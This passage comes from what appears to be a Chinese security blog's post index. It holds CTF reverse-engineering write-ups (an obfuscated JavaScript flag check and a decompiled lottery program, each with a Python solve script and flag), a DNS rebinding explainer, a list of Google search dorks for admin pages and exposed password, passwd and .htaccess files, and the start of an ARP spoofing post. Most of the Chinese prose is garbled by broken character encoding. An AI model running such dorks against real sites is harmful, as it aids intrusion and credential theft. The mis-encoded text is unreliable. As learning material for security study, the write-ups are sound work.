255) &amp; 255) &amp; 255; return ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255 &amp; 255;&#125;function _H4H4H4H4(_0x1b81b8, _0x11e8ab, _0x2c730f) &#123; a = _H4H4H4(_0x1b81b8, _0x2c730f); a = _H4H4H4(a, _H4H4H4(~_0x11e8ab &amp; 255, _H4H4H4([], 1)) &amp; 255); a = _H4H4H4(a, _H4H4H4(~_0x2c730f &amp; 255, _H4H4H4([], 1)) &amp; 255); return a &amp; 255;&#125;function _G00D(_0x51eb06) &#123; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); var _0x8b9e29 = document.getElementById(&quot;passwordError&quot;); _0xcaf3caf3 = []; _0xc4f3c4f3 = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]; Hur1k = &quot;Hur1k&quot;; if (_0x51eb06.length != 39) &#123; _0x8b9e29.textContent = &quot;é”™è¯¯çš„&quot;; return false; &#125; if (_0x51eb06.substr(0, 6) != &quot;XSCTF&#123;&quot;) &#123; _0x8b9e29.textContent = &quot;é”™è¯¯çš„&quot;; return false; &#125; if (_0x51eb06[38] != &quot;&#125;&quot;) &#123; _0x8b9e29.textContent = &quot;é”™è¯¯çš„&quot;; return false; &#125; _0x114514 = _0x51eb06.substr(6, 32); _0x51eb06 = []; for (var _0x28db6c = 0; _0x28db6c &lt; _0x114514.length; _0x28db6c++) &#123; _0x51eb06.push(_0x114514.charCodeAt(_0x28db6c)); &#125; Math.seed = (new Date).getTime(); Math.seededRandom = function (_0x14b0c9, _0x56fb11) &#123; _0x56fb11 = _0x56fb11 || 1; _0x14b0c9 = _0x14b0c9 || 0; Math.seed = (Math.seed * 9301 + 49297) % 233280; var _0xee8b23 = Math.seed / 233280; return parseInt(_0x14b0c9 + _0xee8b23 * (_0x56fb11 - _0x14b0c9)); &#125;; for (var _0x28db6c = 0; _0x28db6c &lt; _0x51eb06.length; _0x28db6c += 2) &#123; tmp = _H4H4H4(_0x51eb06[_0x28db6c], _0x28db6c) ^ _0x28db6c; _0xcaf3caf3.push(tmp); randNum = Math.seededRandom(0, 256); Math.seed = randNum; tmp = _H4H4H4H4(tmp ^ _0x51eb06[_0x28db6c + 1], Hur1k.charCodeAt([_0x28db6c / 2 % Hur1k.length]), randNum); _0xcaf3caf3.push(tmp); &#125; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); if (_0xcaf3caf3.length != 32) &#123; _0x8b9e29.textContent = &quot;ç©¶æé”™è¯¯çš„&quot;; return false; &#125; for (var _0x28db6c = 0; _0x28db6c &lt; _0xcaf3caf3.length; _0x28db6c++) &#123; if (_0xcaf3caf3[_0x28db6c] != _0xc4f3c4f3[_0x28db6c]) &#123; _0x8b9e29.textContent = &quot;é”™è¯¯çš„&quot;; return false; &#125; &#125; return true;&#125; ç„¶åå°±æ˜¯æ‰‹åŠ¨è§£ ä»ç›®æ ‡æ•°ç»„å…¥æ‰‹å›æº¯ æŸ¥çœ‹å¯¹ç›®æ ‡æ•°ç»„æ“ä½œçš„å‡½æ•°ï¼Œå°è¯•é€†å‘ é€†å‘ä¸å‡ºæ¥æ€ä¹ˆåŠï¼ŒæŠŠå‡½æ•°å¤åˆ¶åˆ°æ§åˆ¶å°ï¼Œä¼ å…¥ç®€å•çš„å‚æ•°ï¼Œç„¶åé€ä¸ªä¿®æ”¹å‚æ•°ï¼Œè§‚å¯Ÿå‡½æ•°è¾“å‡º æ ¹æ®è¿™ä¸ªæ–¹æ³•å¯ä»¥æ¨æµ‹å‡º_H4H4H4çš„å®é™…ä½œç”¨æ˜¯ç›¸åŠ ï¼Œ_H4H4H4H4çš„å®é™…åŠŸèƒ½æ˜¯å‰ä¸¤ä¸ªå‚æ•°ç›¸å‡ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ‘†è®¾ æ¶‰åŠåˆ°éšæœºæ•°çš„å‚æ•°å¤§æ¦‚ç‡æ²¡ä»€ä¹ˆç”¨ æœ€åæ‰‹åŠ¨è§£æ··æ·†çš„ç»“æœ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899(() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125;&#125;)();function add(_0x431cb1, _0x516603) &#123; ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255; return ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255 &amp; 255;&#125;function sub(h_a, h_b, h_c) &#123; a = h_a + h_c + (((~h_b &amp; 255) + 1)&amp;255) + (((~h_c &amp; 255) + 1)&amp;255) a = h_a + h_c + 256-h_b + 256-h_c a = 512 + h_a - h_b // a = add(h_a, h_c); // a = add(a, add(~h_b &amp; 255, 1) &amp; 255); // a = add(a, add(~h_c &amp; 255, 1) &amp; 255); return a &amp; 255;&#125;function _G00D(userinput) &#123; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); var pass_err = document.getElementById(&quot;passwordError&quot;); userin = []; target = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]; Hur1k = &quot;Hur1k&quot;; if (userinput.length != 39) &#123; pass_err.textContent = &quot;é”™è¯¯çš„&quot;; return false; &#125; if (userinput.substr(0, 6) != &quot;XSCTF&#123;&quot;) &#123; pass_err.textContent = &quot;é”™è¯¯çš„&quot;; return false; &#125; if (userinput[38] != &quot;&#125;&quot;) &#123; pass_err.textContent = &quot;é”™è¯¯çš„&quot;; return false; &#125; in_slice = userinput.substr(6, 32); userinput = []; for (var i = 0; i &lt; in_slice.length; i++) &#123; userinput.push(in_slice.charCodeAt(i)); &#125; Math.seed = (new Date).getTime(); Math.seededRandom = function (p_a, p_b) &#123; p_b = p_b || 1; p_a = p_a || 0; Math.seed = (Math.seed * 9301 + 49297) % 233280; var p_seed = Math.seed / 233280; return parseInt(p_a + p_seed * (p_b - p_a)); &#125;; for (var i = 0; i &lt; userinput.length; i += 2) &#123; tmp = add(userinput[i], i) ^ i; userin.push(tmp); randNum = Math.seededRandom(0, 256); Math.seed = randNum; tmp = sub(tmp ^ userinput[i + 1], Hur1k.charCodeAt([i / 2 % Hur1k.length]), randNum); userin.push(tmp); &#125; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); if (userin.length != 32) &#123; pass_err.textContent = &quot;ç©¶æé”™è¯¯çš„&quot;; return false; &#125; for (var i = 0; i &lt; userin.length; i++) &#123; if (userin[i] != target[i]) &#123; pass_err.textContent = &quot;é”™è¯¯çš„&quot;; return false; &#125; &#125; return true;&#125; exp.py 12345678910Hur1k = &quot;Hur1k&quot;s = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]charCode = [0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0]for i in range(30, -1, -2): s[i+1] = ((s[i+1]+ord(Hur1k[charCode[i]]))&amp;255)^s[i] s[i] = (s[i]^i)-ifor i in s: print(chr(i), end=&#x27;&#x27;) UR_R341Ly_900d_47_Obfu_ur_Newn3W ä¸€äº›è§£æ··æ·†çš„ç½‘ç«™ Obfuscator.io Deobfuscator (deobfuscate.io) JavaScript Deobfuscator (deobfuscate.io) ä¸»é¡µ - DeJs JavaScript Deobfuscator (relative.im) å·¥å…· v_jstoolsï¼ˆæµè§ˆå™¨æ’ä»¶ï¼Œéœ€é…ç½®ï¼‰ â€“ ç½‘é¡µ js é€†å‘åˆ†æ ( v_jstools )ã€jshook ( å®‰å“ä¸Šç”¨jså®ç°Hook )-CSDNåšå®¢ lotery shopæ ¸å¿ƒä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495void __noreturn sub_140017AC0()&#123; char *v0; // rdi __int64 i; // rcx char v2; // [rsp+60h] [rbp+0h] BYREF char v3[80]; // [rsp+68h] [rbp+8h] BYREF char v4[80]; // [rsp+B8h] [rbp+58h] BYREF char v5[96]; // [rsp+108h] [rbp+A8h] BYREF char v6[80]; // [rsp+168h] [rbp+108h] BYREF int v7[20]; // [rsp+1B8h] [rbp+158h] BYREF int v8[20]; // [rsp+208h] [rbp+1A8h] BYREF int v9[20]; // [rsp+258h] [rbp+1F8h] BYREF int v10[20]; // [rsp+2A8h] [rbp+248h] BYREF char v11[76]; // [rsp+2F8h] [rbp+298h] BYREF int v12[8]; // [rsp+344h] [rbp+2E4h] BYREF int v13[19]; // [rsp+364h] [rbp+304h] BYREF char v14[180]; // [rsp+3B0h] [rbp+350h] BYREF int v15[148]; // [rsp+464h] [rbp+404h] BYREF int v16; // [rsp+6B4h] [rbp+654h] v0 = &amp;v2; for ( i = 266i64; i; --i ) &#123; *(_DWORD *)v0 = -858993460; v0 += 4; &#125; sub_140011690(&amp;unk_14002D06A); v13[0] = 0; v13[8] = 10; j_memset(v14, 0, 30ui64); v15[0] = 0; sub_14001117C(v3, &quot;Sloth&#x27;s lottery shop is open!&quot;); sub_14001117C(v4, &quot;You&#x27;re our first customer!&quot;); sub_1400114CE(v5, &quot;We will give you a free lottery ticket, the number is: &quot;); sub_14001117C(v6, &quot;Please enter your choice &#123;1-5&#125;&quot;); sub_14001117C(v7, &quot;1.buy a lottery ticket&quot;); sub_14001117C(v8, &quot;2.Check to see if you won&quot;); sub_14001117C(v9, &quot;3.join us&quot;); sub_14001117C(v10, &quot;4.Take a sneak peek at the flag&quot;); sub_14001117C(v11, &quot;5.exit&quot;); sub_1400110FF( (int)v3, (int)v4, (int)v5, (int)v6, (__int64)v7, (__int64)v8, (__int64)v9, (__int64)v10, (__int64)v11, (__int64)v13, (__int64)v15, (__int64)v14); while ( 1 ) &#123; while ( 1 ) &#123; sub_14001156E((int)v7, (int)v8, (int)v9, (int)v10, v11, v6); sub_1400113CA(&quot;%d&quot;, v12); v16 = v12[0]; if ( v12[0] != 1 ) break; system(&quot;cls&quot;); sub_1400111EF(v15, (__int64)v14); sub_1400111BD(); &#125; switch ( v16 ) &#123; case 2: system(&quot;cls&quot;); sub_140011708(v15, v14, (unsigned int)v13[0]); sub_1400111BD(); break; case 3: system(&quot;cls&quot;); sub_14001149C(); sub_1400111BD(); break; case 4: system(&quot;cls&quot;); sub_1400114E7(); sub_1400111BD(); break; case 5: system(&quot;cls&quot;); puts(&quot;Welcome again&quot;); sub_1400111BD(); exit(1); default: puts(&quot;input error&quot;); sub_1400111BD(); break; &#125; &#125;&#125; è¿™é‡Œå¹¶æ²¡æœ‰æœ‰å…³flagçš„ä¿¡æ¯ï¼ŒçœŸæ­£çš„flagåœ¨sub_1400110FFå‡½æ•°ä¸­ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576__int64 __fastcall sub_140016760( __int64 a1, __int64 a2, __int64 a3, __int64 a4, _BYTE *a5, __int64 a6, __int64 a7, __int64 a8, _BYTE *a9, _DWORD *a10, int *a11, __int64 a12)&#123; unsigned int v12; // eax _BYTE *v14; // [rsp+1E8h] [rbp+1C8h] int v15; // [rsp+264h] [rbp+244h] int v16; // [rsp+264h] [rbp+244h] int i; // [rsp+284h] [rbp+264h] int v18; // [rsp+2A4h] [rbp+284h] int j; // [rsp+2C4h] [rbp+2A4h] __int64 v20; // [rsp+2E8h] [rbp+2C8h] sub_140011690(&amp;unk_14002D06A); v14 = (_BYTE *)sub_1400112AD(14i64); puts((const char *)a1); puts((const char *)a2); v14[9] = *a5; v14[2] = v14[9]; v14[1] = *(_BYTE *)(a1 + 10) - 12; v14[10] = *(_BYTE *)(a3 + 5) - 56; v14[7] = *(_BYTE *)(a6 + 15) - 10; v14[13] = toupper((char)(*(_BYTE *)(a8 + 3) + 3)); v14[3] = *(_BYTE *)(a2 + 1) + 4; v14[11] = toupper((char)(*(_BYTE *)(a7 + 7) - 14)); v14[4] = v14[7]; *v14 = tolower((char)(*a9 + 31)); v14[8] = toupper(*(char *)(a8 + 27)); v14[5] = toupper((char)(*(_BYTE *)(a4 + 13) - 16)); v14[6] = v14[3]; v14[12] = a5[6] - 39; v12 = sub_1400180A0(0i64); srand(v12); v15 = 1; for ( i = 0; i &lt; 8; ++i ) &#123; v18 = rand() % 10; if ( i != 7 || v18 ) &#123; *a10 += v18 * v15; v15 *= 10; &#125; else &#123; --i; &#125; &#125; v16 = 1; for ( j = 0; j &lt; 8; ++j ) &#123; v20 = rand() % 10; if ( j != 7 || v20 ) &#123; if ( j ) *(_QWORD *)(a12 + 8i64 * *a11) += v20 * v16; else *(_QWORD *)(a12 + 8i64 * *a11) = v20; v16 *= 10; &#125; else &#123; --j; &#125; &#125; return sub_1400112E9(&quot;%s %d\\n&quot;, (const char *)a3, *(_QWORD *)(a12 + 8i64 * (*a11)++));&#125; çœŸæ­£çš„flagåœ¨v14å˜é‡ä¸­ï¼Œæ˜¯æ ¹æ®å·²æœ‰çš„å˜é‡å˜æ¢å¾—åˆ°çš„ exp 12345678910111213141516171819202122232425262728293031v3 = &quot;Sloth&#x27;s lottery shop is open!&quot;v4 = &quot;You&#x27;re our first customer!&quot;v5 = &quot;We will give you a free lottery ticket, the number is: &quot;v6 = &quot;Please enter your choice &#123;1-5&#125;&quot;v7 = &quot;1.buy a lottery ticket&quot;v8 = &quot;2.Check to see if you won&quot;v9 = &quot;3.join us&quot;v10 = &quot;4.Take a sneak peek at the flag&quot;v11 = &quot;5.exit&quot;v13 = [0, 0, 0, 0, 0, 0, 0, 0, 10]v15 = [0] * 10v14 = [0] * 10V14 = [0] * 14V14[9] = v7[0]V14[2] = V14[9]V14[1] = chr(ord(v3[10])-12)V14[10] = chr(ord(v5[5]) - 56)V14[7] = chr(ord(v8[15]) - 10)V14[13] = chr(ord(v10[3]) + 3).upper()#V14[3] = chr(ord(v4[1]) + 4)V14[11] = chr(ord(v9[7])-14).upper()#V14[4] = (V14[7])V14[0] = chr(ord(v11[0])+31).lower()#lV14[8] = (v10[27]).upper()#V14[5] = chr(ord(v6[13])-16).upper()#V14[6] = V14[3]V14[12] = chr(ord(v7[6])-39)print(&#x27;&#x27;.join(V14)) XSCTF&#123;th1s_Is_F14G:D&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"DNSé‡ç»‘å®š","slug":"dns_rebinding_attack","date":"2022-04-17T09:09:58.753Z","updated":"2024-11-09T19:24:12.633Z","comments":true,"path":"2022/04/17/dns_rebinding_attack/","link":"","permalink":"http://uniqueland.top/2022/04/17/dns_rebinding_attack/","excerpt":"","text":"DNSé‡ç»‘å®šDNSé‡ç»‘å®šæŒ‡çš„æ˜¯åœ¨ç”¨æˆ·è®¿é—®åŸŸåæ—¶æ›´æ”¹åŸŸåæŒ‡å‘çš„IPä»è€Œä»¤ç”¨æˆ·è®¿é—®æŒ‡å®šIPçš„æ”»å‡»æ‰‹æ³• DNSï¼šç”±äºç½‘ç»œä¼ è¾“éœ€è¦IPåœ°å€ï¼Œæ•…éœ€è¦DNSï¼ˆDomian Name Serverï¼‰ç”¨äºæŸ¥è¯¢ç»™å®šåŸŸåæŒ‡å‘çš„IP åŒæºç­–ç•¥ï¼ˆThe Same-origin Policyï¼‰ï¼š The same-origin policy restricts which network messages one origin can send to another. For example, the same-origin policy allows inter-origin HTTP requests with GET and POST methods but denies inter-origin PUT and DELETE requests. Additionally, origins can use custom HTTP headers when sending requests to themselves but cannot use custom headers when sending requests to other origins. The restrictions on reading information received from other origins is also somewhat subtle. For example, the HTML &lt;script&gt; element can execute content retrieved from foreign origins, which means web sites should not rely on the same-origin policy to protect the confidentiality of information in a format that happens to parse as script (e.g., JavaScript source files, JSON format, JSONP services, or JavaScript/gif polyglots). For all such resources, no loss of security would result (and much flexibility would be gained) from adding the Access-Control-Allow-Origin:* header to all responses. ä»¥ä¸Šè§£é‡Šæ¥è‡ªäºSame Origin Policy - Web Security (w3.org) ç®€å•æ¥è¯´ï¼Œä¸ºäº†é˜²æ­¢æ·˜å®ç½‘å¸¦ç€ä½ çš„è´¦æˆ·ä¿¡æ¯è®¿é—®äº¬ä¸œï¼Œéœ€è¦åŒæºç­–ç•¥æ¥é™åˆ¶ä¸åŒç½‘ç«™ä¹‹é—´çš„è®¿é—®è§„èŒƒ â€‹ å¯ä»¥çœ‹å‡ºåŒæºçš„è¦æ±‚æ˜¯â€œåè®®+ç«¯å£+åŸŸå/ipâ€ï¼Œè€Œå¦‚æœä»¥åŸŸåè®¿é—®ç½‘ç«™ï¼ˆé€šå¸¸çš„åšæ³•ï¼‰æ—¶åŒæºç­–ç•¥å°±å˜æˆäº†â€œåè®®+ç«¯å£+åŸŸåâ€è¿™å°±ç»™äº†DNSé‡ç»‘å®šæ”»å‡»å®ç°çš„å¯èƒ½ è¦å®ç°DNSé‡ç»‘å®šæ”»å‡»ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡ä»¥ä¸‹æ¡ä»¶ï¼š è¯±ä½¿ç”¨æˆ·ç‚¹å‡»ç»™å®šé“¾æ¥ï¼ˆé’“é±¼é‚®ä»¶ã€é’“é±¼çŸ­ä¿¡ã€ç¤¾å·¥ç­‰ï¼‰ å¯æ§çš„DNSæœåŠ¡å™¨ï¼ˆè‡ªå·±æ­å»ºä¸€ä¸ªæˆ–è€…æŠ¢ä¸€ä¸ªï¼‰ â€‹ DNSé‡ç»‘å®šæ”»å‡»ä¼šè¯±ä½¿ç”¨æˆ·è®¿é—®ä¸€ä¸ªåŸŸåï¼Œåœ¨ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®æ—¶ä»¥æ­£å¸¸çš„IPè¿›è¡Œé€šä¿¡ï¼Œå¹¶ä¸”åœ¨è¿”å›çš„DNSæŸ¥è¯¢ç»“æœä¸­å°†TTLè®¾ç½®ä¸º1æˆ–å…¶ä»–æ¯”è¾ƒå°çš„æ•°å­—ï¼Œåœ¨è¯±ä½¿ç”¨æˆ·ä»¥ç‚¹å‡»ç­‰è¡Œä¸ºæ„é€ å¥½æ¶æ„è¯·æ±‚æ—¶ï¼Œæ”»å‡»è€…ä¸€èˆ¬ä¼šä¿®æ”¹DNSæœåŠ¡å™¨ä¸Šè¯¥åŸŸåæŒ‡å‘çš„IPï¼Œä»è€Œå°†æ¶æ„è¯·æ±‚å‘é€è‡³æ”»å‡»è€…æŒ‡å®šçš„IPï¼› TTLï¼ˆTime To Liveï¼‰æŒ‡çš„æ˜¯dnsæŸ¥è¯¢ç»“æœçš„æœ‰æ•ˆæ—¶é—´ï¼Œé€šè¿‡ä¿®æ”¹TTLä¸ºä¸€ä¸ªè¾ƒå°çš„å€¼ä»è€Œå®ç°å—å®³è€…ä¸DNSæœåŠ¡å™¨çš„é¢‘ç¹é€šä¿¡ï¼Œä»è€Œä¿è¯åœ¨ä¿®æ”¹åŸŸåæŒ‡å‘çš„IPæ—¶èƒ½ç«‹å³ç”Ÿæ•ˆ â€‹ æ˜“å—æ”»å‡»çš„è®¾å¤‡ï¼šä¸€èˆ¬æ˜¯ä½äºå†…ç½‘çš„æ™ºèƒ½å®¶å±…è®¾å¤‡ï¼Œç”±äºæ”»å‡»è€…æ— æ³•ä»å¤–ç½‘è®¿é—®å—å®³è€…çš„å†…ç½‘ï¼Œæ•…ä»¥æ­¤ç§æ”»å‡»ä¼ªé€ èº«ä»½è®¿é—®å†…ç½‘ï¼ˆSSRFï¼‰ï¼›æ¯”å¦‚æ’æ¸©å™¨ï¼Œè‹¥åœ¨ä¸€ä¸ªåªæœ‰è€äººçš„åœºæ‰€ä¸­ï¼Œè¿™ç§æ”»å‡»å¾€å¾€æ˜¯è‡´å‘½çš„ quoteSame Origin Policy - Web Security (w3.org)åˆ©ç”¨DNSé‡ç»‘å®šæ”»å‡»ä¸“ç”¨ç½‘ç»œ - çŸ¥ä¹ (zhihu.com)ä»0åˆ°1è®¤è¯†DNSé‡ç»‘å®šæ”»å‡» - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"GoogleHacking","slug":"google_hacking","date":"2022-04-09T09:12:54.823Z","updated":"2024-11-09T19:29:59.383Z","comments":true,"path":"2022/04/09/google_hacking/","link":"","permalink":"http://uniqueland.top/2022/04/09/google_hacking/","excerpt":"","text":"Google HackingGoogle hackingæ˜¯ä¸€ç³»åˆ—ç”¨äºé«˜æ•ˆè¿ç”¨æœç´¢å¼•æ“çš„æŠ€å·§ï¼Œä¹Ÿå¯ä»¥ç”¨äºæµ‹è¯•æ¼æ´ç­‰ç”¨å¤„ A and B é€»è¾‘ä¸ï¼Œç”¨äºæŸ¥æ‰¾åŒæ—¶åŒ…å«Aå’ŒBçš„å†…å®¹ A or B é€»è¾‘æˆ–ï¼Œç”¨äºæŸ¥æ‰¾åŒ…å«Aæˆ–åŒ…å«Bæˆ–åŒæ—¶åŒ…å«Aå’ŒBçš„å†…å®¹ A -B é€»è¾‘éï¼Œç”¨äºæŸ¥æ‰¾Aä½†ä¸åŒ…å«Bçš„å†…å®¹ â€œxxx yyyâ€ å®Œæ•´åŒ¹é…ï¼Œç”¨äºæŸ¥æ‰¾å¸¦æœ‰å®Œæ•´xxx yyyçš„å†…å®¹ site:xxx.com yyy æŒ‡å®šæœç´¢èŒƒå›´ï¼Œç”¨äºæœç´¢ç‰¹å®šèŒƒå›´ï¼ˆxxx.comï¼‰å†…æœ‰å…³yyyçš„å†…å®¹ filetype:txt xxx æŒ‡å®šæœç´¢æ–‡ä»¶ç±»å‹ï¼Œç”¨äºæœç´¢æœ‰å…³xxxçš„txtæ–‡ä»¶ inurl:aaa æœç´¢åŒ¹é…ç½‘å€ä¸­å¸¦aaaçš„å†…å®¹ allinurl: aaa bbb ä¸inurlç›¸ä¼¼ï¼Œåªä¸è¿‡å¯ä»¥æŒ‡å®šå¤šä¸ªå…³é”®è¯ intext:aaa xxx æœç´¢åŒ¹é…ç½‘é¡µæ­£æ–‡ä¸­å¸¦aaaçš„ä¸”æœ‰å…³xxxçš„å†…å®¹ intitle:xxx æœç´¢åŒ¹é…ç½‘é¡µçš„æ ‡é¢˜ä¸­åŒ…å«xxxçš„å†…å®¹ xxx* ä½¿ç”¨é€šé…ç¬¦*æœç´¢æœ‰å…³ä»¥xxxä¸ºå‰ç¼€çš„å†…å®¹ link:xxx.com è¿”å›æ‰€æœ‰æŒ‡å‘xxx.comçš„ç½‘é¡µ related:xxx.com è¿”å›æ‰€æœ‰ä¸xxx.comç›¸ä¼¼çš„ç½‘é¡µï¼ˆæŒ‡å¸ƒå±€ç›¸ä¼¼ï¼‰ cache:xxx.com [yyy] è¿”å›æœç´¢å¼•æ“æœ‰å…³xxx.comçš„ç¼“å­˜ï¼Œå¦‚æœåŠ ä¸Šå…³é”®è¯ï¼Œåˆ™ç½‘é¡µä¸­çš„å…³é”®è¯ä¼šè¢«é«˜äº® info:www.xxx.com è¿”å›æœ‰å…³ç«™ç‚¹www.xxx.comçš„ç›¸å…³ä¿¡æ¯ define:xxx è¿”å›æœ‰å…³xxxçš„å®šä¹‰ Index of /xxx è¿”å›å…è®¸å½“ä½œç›®å½•è®¿é—®çš„ç½‘é¡µ ä¸€äº›æŠ€å·§ï¼šæŸ¥æ‰¾ç½‘ç«™åå°site:xx.com intext:ç®¡ç† site:xx.com inurl:login site:xx.com intitle:åå° æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åºsite:xx.com filetype:asp site:xx.com filetype:php site:xx.com filetype:jsp site:xx.com filetype:aspx æŸ¥çœ‹ä¸Šä¼ æ¼æ´site:xx.com inurl:file site:xx.com inurl:load æŸ¥çœ‹å¯è®¿é—®ç›®å½•index of /admin index of /passwd index of /password index of /mail â€œindex of /â€œ +passwd â€œindex of /â€œ +password.txt â€œindex of /â€œ +.htaccess â€œindex of /rootâ€ â€œindex of /cgi-binâ€ â€œindex of /logsâ€ â€œindex of /configâ€ quoteGoogle-Hacking è¯­æ³•ç¬”è®°_Simon_Smithçš„åšå®¢-CSDNåšå®¢ 2-ä¿¡æ¯æ”¶é›†â€”Google hacking_songly_çš„åšå®¢-CSDNåšå®¢ ä¿¡æ¯æ”¶é›†ä¹‹Google Hackingçš„ç®€å•ç”¨æ³•_è°¢å…¬å­çš„åšå®¢-CSDNåšå®¢_google hacking Google Hackingä½¿ç”¨è¯¦è§£_Teacher.Huçš„åšå®¢-CSDNåšå®¢_google hacking","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"arpæ¬ºéª—åˆæ¬¡å°è¯•","slug":"arp_cheat","date":"2022-04-03T12:21:02.410Z","updated":"2024-11-09T19:31:33.225Z","comments":true,"path":"2022/04/03/arp_cheat/","link":"","permalink":"http://uniqueland.top/2022/04/03/arp_cheat/","excerpt":"","text":"ARPæ¬ºéª—æ˜¯ä»€ä¹ˆARPæ¬ºéª—ï¼ˆARP spoofingï¼‰ï¼Œåˆç§°ARPæ¯’åŒ–ï¼ˆARP poisoningï¼Œç½‘ç»œä¸Šå¤šè¯‘ä¸ºARPç—…æ¯’ï¼‰æˆ–ARPæ”»å‡»ï¼Œæ˜¯é’ˆå¯¹ä»¥å¤ªç½‘åœ°å€è§£æåè®®ï¼ˆARPï¼‰çš„ä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œé€šè¿‡æ¬ºéª—å±€åŸŸç½‘å†…è®¿é—®è€…PCçš„ç½‘å…³MACåœ°å€ï¼Œä½¿è®¿é—®è€…PCé”™ä»¥ä¸ºæ”»å‡»è€…æ›´æ”¹åçš„MACåœ°å€æ˜¯ç½‘å…³çš„MACï¼Œå¯¼è‡´ç½‘ç»œä¸é€šã€‚æ­¤ç§æ”»å‡»å¯è®©æ”»å‡»è€…è·å–å±€åŸŸç½‘ä¸Šçš„æ•°æ®åŒ…ç”šè‡³å¯ç¯¡æ”¹æ•°æ®åŒ…ï¼Œä¸”å¯è®©ç½‘ç»œä¸Šç‰¹å®šè®¡ç®—æœºæˆ–æ‰€æœ‰è®¡ç®—æœºæ— æ³•æ­£å¸¸è¿çº¿ã€‚ ä»¥ä¸Šæ¥è‡ªç™¾åº¦ç™¾ç§‘ ä¸ªäººç†è§£å¤§æ¦‚åŸç†å°±æ˜¯åœ¨æ¯å°ç”¨äºä¸Šç½‘çš„æœºå™¨ä¸­éƒ½ä¼šæœ‰ä¸€å¼ å«arpç¼“å­˜è¡¨çš„ä¸œè¥¿ï¼Œé‡Œè¾¹è®°å½•äº†ipåœ°å€ä¸macåœ°å€ï¼ˆç‰©ç†åœ°å€ï¼‰çš„æ˜ å°„å…³ç³» è¿™å¼ è¡¨çš„å½¢æˆè¿‡ç¨‹å¦‚ä¸‹ï¼š å‡è®¾ç°åœ¨æˆ‘è¦ä¸ipåœ°å€ä¸º192.168.1.2çš„ä¸»æœºé€šä¿¡ï¼Œæˆ‘å°±å‘å±€åŸŸç½‘å†…çš„æ‰€æœ‰ä¸»æœºå¹¿æ’­æ¶ˆæ¯â€œè°æ˜¯192.168.1.2 ï¼Ÿâ€ï¼Œè¿™æ—¶å¦‚æœè¯¥ipçš„ä¸»æœºæ”¶åˆ°äº†å¹¿æ’­ï¼Œå°±ä¼šå‘å‘å‡ºå¹¿æ’­çš„ä¸»æœºå›åº”â€œ192.168.1.2æ˜¯æˆ‘ï¼Œæˆ‘çš„macåœ°å€æ˜¯xxxâ€ï¼Œç„¶åå‘å‡ºå¹¿æ’­çš„ä¸»æœºå°±å°†è¯¥ipå’Œè¯¥macåœ°å€è®°å½•åˆ°æœ¬æœºçš„arpç¼“å­˜è¡¨ä¸­ è€Œarpæ¬ºéª—è¦åšçš„ï¼Œå°±æ˜¯å‡è£…è‡ªå·±æ˜¯æŸä¸€å°è¢«è¯·æ±‚çš„ä¸»æœºï¼ŒæŠŠè‡ªå·±çš„macåœ°å€ä¸è¢«å‡è£…ä¸»æœºçš„ipç»‘å®šèµ·æ¥è®°å½•åœ¨åˆ«äººçš„arpç¼“å­˜è¡¨ä¸­ï¼›ç”±äºç½‘ç»œçš„å®é™…ä¼ 